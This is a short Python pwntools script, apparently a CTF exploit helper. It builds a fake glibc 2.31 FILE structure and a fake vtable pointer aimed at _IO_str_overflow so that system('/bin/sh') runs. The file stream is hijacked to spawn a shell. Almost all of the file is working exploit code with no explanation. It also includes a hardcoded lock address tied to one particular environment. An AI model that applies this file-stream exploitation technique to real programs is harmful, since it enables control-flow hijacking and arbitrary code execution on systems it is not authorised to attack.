#!/usr/bin/env python3

from pwn import *

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0):
    struct = p32(_flags) + \
             p32(0) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    struct = struct.ljust(0x88, b"\x00")
    struct += p64(_lock)
    struct = struct.ljust(0xd8, b"\x00")
    return struct

# Assumes 2.31
def make_bad_fio(libc: ELF):
    if libc.address == 0:
        return None
    
    rip = libc.symbols['system']
    rdi = next(libc.search(b"/bin/sh"))

    io_str_overflow_ptr_addr = libc.symbols['_IO_file_jumps'] + 0xd8
    fake_vtable_addr = io_str_overflow_ptr_addr - 8*2

    print(f"rip: {rip} | rdi {rdi} | vtable_addr: {hex(fake_vtable_addr)}")
    # io_str_overflow_ptr_addr = libc_base + libc.symbols['_IO_file_jumps'] + 0xd8
    # fake_vtable_addr = io_str_overflow_ptr_addr - 2*8


    file_struct = pack_file(_IO_buf_base = 0,
                            _IO_buf_end = (rdi-100)//2,
                            _IO_write_ptr = (rdi-100)//2,
                            _IO_write_base = 0,
                            _lock = 0x7ffff7db57d0)
    
    # vtable pointer
    file_struct += p64(fake_vtable_addr)
    file_struct += p64(rip)

    return file_struct